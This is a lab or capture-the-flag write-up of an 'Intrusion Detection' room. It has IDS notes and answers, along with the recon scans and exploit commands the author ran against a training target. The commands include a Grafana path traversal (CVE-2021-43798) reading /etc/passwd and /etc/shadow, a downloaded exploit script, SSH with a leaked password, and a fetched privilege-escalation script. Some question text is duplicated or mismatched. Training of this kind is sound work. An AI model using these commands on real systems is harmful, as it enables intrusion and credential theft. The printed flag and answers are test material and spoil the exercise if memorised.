<p>June 24,2025</p>
<h1>Intrusion Detection</h1>

![image](https://github.com/user-attachments/assets/91e1a9a0-af85-44fc-9f55-bac1e8df82e6)



<h1>I learned in <code>Intrusion Detection</code></code>:</h1>
<p>

- <code>IDS</code> = Introduction Detection Systems<br>
- IDS apply 2 detection methodologies: <code>Signature (or rule) based</code> and <code>Anomaly-based</code>.<br>
- once an incident is detected, the IDS will generate and <code>alert</code>.<br>
- <code>Suricata</code> is a <code>NIDS</code>, Network-based IDS .<br>
- <code>Wazuh</code>  is an HIDS, Host-based IDS.<br>
- <code>NIDS</code> monitor networks for malicious activity by checking packets for traces of activity associated with a wide variety of hostile or unwanted activity: Malware command and control, Exploitation tools, Scanning, Data exfiltration, Contact with phishing sites andCorporate policy violations. <code>NIDS</code> are more prone to generating false positives than other IDS.<br>
- ...<br>
- nmap and other scanners are active sonar, then open-source intelligence or OSINT is passive sonar<br>


  
</p>

<br>

<h2>Task 1 . Introduction</h2>

<p>

- deployed the target machine<br>
- registered in the CTFScore system<br>
- tooke note of the token provided<br>
- logged in<br>
- inspected the dashboard</p>

<p>1.1. Deploy the target machine and create an account and log into the system at http://TargetIP:8000, in preparation for future tasks.<br>
<code>No answer needed</code></p>

<br>

<h2>Task 2 . Intrusion Detection Basics</h2>

<p>2.1. What IDS detection methodology relies on rule sets?<br>
<code>Signature-based detection</code></p>

<br>

<h2>Task 3 . Network-bsed IDS (NIDS)</h2>

<p>3.1. What widely implemented protocol has an adverse effect on the reliability of NIDS?<br>
<code>TLS</code></p>

<p>3.2. Experiment by running tools against the target and viewing the resultant alerts. Is there any unexpected activity?<br>
<code>No answer needed</code></p>

```bash
:~# nmap -sS --script "http-date" TargetIP
```

```bash
:~# nmap -sS -p- --script "http-date" TargetIP
```

```bash
:~# nmap -A" TargetIP
```

<br>

<h2>Task 4 . Reconnaissance and Evasion Bsics</h2>

```bash
:~# nmap -sV --script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" 10.10.21.185
...
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
8000/tcp open  http-alt gunicorn
```
 
```bash
:~# nmap --script=vuln --script-args http.useragent="Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)" 10.10.21.185
```

<p>4.1. What scale is used to measure alert severity in Suricata? (*-*)<br>
<code>1-3</code></p>

<p>4.2. How many services is nmap able to fully recognise when the service scan (-sV) is performed?<br>
<code>3</code></p>

<br>

<h2>Task 5 . Further Reconnaissance Evasion</h2>

```bash
:~# nikto -p 80,3000 -h TargetIP
- Nikto v2.1.5
---------------------------------------------------------------------------
...
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x5e7 0x5db579800d8b8 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
...
+ Server: No banner retrieved
+ Cookie redirect_to created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: deny
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ OSVDB-3092: /login/: This might be interesting...
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
...
+ 2 host(s) tested
```

```bash
:~# nikto -H
...
-Tuning+           Scan tuning:
                               1     Interesting File / Seen in logs
                               2     Misconfiguration / Default File
                               3     Information Disclosure
                               4     Injection (XSS/Script/HTML)
                               5     Remote File Retrieval - Inside Web Root
                               6     Denial of Service
                               7     Remote File Retrieval - Server Wide
                               8     Command Execution / Remote Shell
                               9     SQL Injection
...
```

```bash
:~# nikto -H | grep space
                               6     TAB as request spacer
                               A     Use a carriage return (0x0d) as a request spacer
                               B     Use binary value 0x0b as a request spacer
```

<p>5.1. Nikto, should find an interesting path when the first scan is performed, what is it called?<br>
<code>/login</code></p>

<p>5.2. What value is used to toggle denial of service vectors when using scan tuning (-T) in nikto?<br>
<code>6</code></p>

<p>5.3. Which flags are used to modify the request spacing in nikto? Use commas to separate the flags in your answer.<br>
<code>6,A,B</code></p>

<br>

<h2>Task 6 . Open-Source Intelligence</h2>

<p>6.1. What version of Grafana is the server running?<br>
<code>8.2.5</code></p>

![image](https://github.com/user-attachments/assets/d08c8c2e-408e-4841-ba35-471f60d0a902)

```bash
:~# curl --path-as-is http://10.10.21.185:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
syslog:x:105:106::/home/syslog:/usr/sbin/nologin
ossec:x:106:108::/var/ossec:/sbin/nologin
grafana:x:107:109::/usr/share/grafana:/bin/false
```

```bash
:~# curl --path-as-is http://10.10.21.185:3000/public/plugins/alertlist/../../../../../../../../../../etc/shadow
root:*:19067:0:99999:7:::
daemon:*:19067:0:99999:7:::
bin:*:19067:0:99999:7:::
sys:*:19067:0:99999:7:::
sync:*:19067:0:99999:7:::
games:*:19067:0:99999:7:::
man:*:19067:0:99999:7:::
lp:*:19067:0:99999:7:::
mail:*:19067:0:99999:7:::
news:*:19067:0:99999:7:::
uucp:*:19067:0:99999:7:::
proxy:*:19067:0:99999:7:::
www-data:*:19067:0:99999:7:::
backup:*:19067:0:99999:7:::
list:*:19067:0:99999:7:::
irc:*:19067:0:99999:7:::
gnats:*:19067:0:99999:7:::
nobody:*:19067:0:99999:7:::
_apt:*:19067:0:99999:7:::
systemd-timesync:*:19085:0:99999:7:::
systemd-network:*:19085:0:99999:7:::
systemd-resolve:*:19085:0:99999:7:::
messagebus:*:19085:0:99999:7:::
syslog:*:19085:0:99999:7:::
ossec:*:19088:0:99999:7:::
grafana:*:19088:0:99999:7:::
```

```bash
:~# wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/src/exploit.py
...
:~# python3 exploit.py -u 10.10.21.185 -p 3000 -f /etc/passwd
Conneting To Server 
Sending Request to http://10.10.21.185:3000/public/plugins/alertlist/../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
syslog:x:105:106::/home/syslog:/usr/sbin/nologin
ossec:x:106:108::/var/ossec:/sbin/nologin
grafana:x:107:109::/usr/share/grafana:/bin/false
:~# python3 exploit.py -u 10.10.21.185 -p 3000 -f /etc/grafana/grafana.ini > report
...
:~# ssh grafana-admin@10.10.21.185
...
##################################        Reverse Gear Racing LTD.          ############################################################
...
grafana-admin@reversegear:~$
```

<p>6.2. What is the ID of the severe CVE that affects this version of Grafana?<br>
<code>CVE-2021-43798</code></p>

![image](https://github.com/user-attachments/assets/45cca7bf-59fb-499c-9365-ac8ecad75590)

<p>6.3. If this server was publicly available, What site might have information on its services already?<br>
<code>Shodan</code></p>

<p>6.4. If this server was publicly available, What site might have information on its services already?<br>
<code>site:example.com filetype:pdf</code></p>

<br>

<h2>Task 7 . Rulesets</h2>

<p>7.1. What is the password of the grafana-admin account?<br>
<code>GraphingTheWorld32</code></p>

<p>7.2. Is it possible to gain direct access to the server now that the grafana-admin password is known? (yay/nay)<br>
<code>yay</code></p>

<p>7.3. Are any of the attached IDS able to detect the attack if the file /etc/shadow is requested via the exploit, if so what IDS detected it?<br>
<code>suricata</code></p>

<br>

<h2>Task 8 . Host Based IDS (HIDS)</h2>

<p>8.1. What category does Wazuh place HTTP 400 error codes in?<br>
<code>web</code></p>

<p>8.2. Play around with some post-exploitation tools and commands and make note of what activity is detected by Wazuh; compare it to the activity that's detected by Suricata.<br>
<code>No answer needed</code></p>

<br>

<h2>Task 9 . Privilege Eacalation Recon</h2>

```bash
:~# python3 -m http.server
```

```bash
grafana-admin@reversegear:/tmp$ wget http://10.10.69.48:8000/linpeas.sh
...
linpeas.sh                        100%[==========================================================>] 227.91K  --.-KB/s    in 0.001s  
...
grafana-admin@reversegear:/tmp$ chmod +x linpeas.sh
grafana-admin@reversegear:/tmp$ ./linpeas.sh
```

<p>9.1. What tool does linPEAS detect as having a potential escalation vector?<br>
<code>docker</code></p>

<p>9.2. Is an alert triggered by Wazuh when linPEAS is added to the system, if so what its severity?<br>
<code>5</code></p>

<br>

<h2>Task 10 . Performing Privilege Escalation</h2>

<p>10.1. Perform the privilege escalation and grab the flag in /root/<br>
<code>{SNEAK_ATTACK_CRITICAL}</code></p>

<br>

<h2>Task 11 . Establishing Persistence</h2>

<p>11.1. Abuse docker to establish a backdoor on the host system<br>
<code>No answer needed</code></p>

<br>

<h2>Task 12 . Conclusion</h2>

<p>12.1. Abuse docker to establish a backdoor on the host system<br>
<code>No answer needed</code></p>




![image](https://github.com/user-attachments/assets/62c5e1b3-f3a0-461b-aab2-0eae02513023)

![image](https://github.com/user-attachments/assets/e2388928-1451-42f5-a9af-498c6ef52ab8)



<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 24, 2025     | 414      |     192nd    |      6ᵗʰ     |     264ᵗʰ   |     6ᵗʰ    |  109,843 |    799    |     63    |

</div>

![image](https://github.com/user-attachments/assets/fd34af0d-62f0-4ac3-8ae7-682f826c21ba)

![image](https://github.com/user-attachments/assets/a2c16a81-1b0a-461d-9b39-90c083c8f078)


![image](https://github.com/user-attachments/assets/b980ee27-4919-4242-9a0c-88386ecc8e81)


![image](https://github.com/user-attachments/assets/dacc36c1-f439-412a-8a8c-aa7a35eead9d)

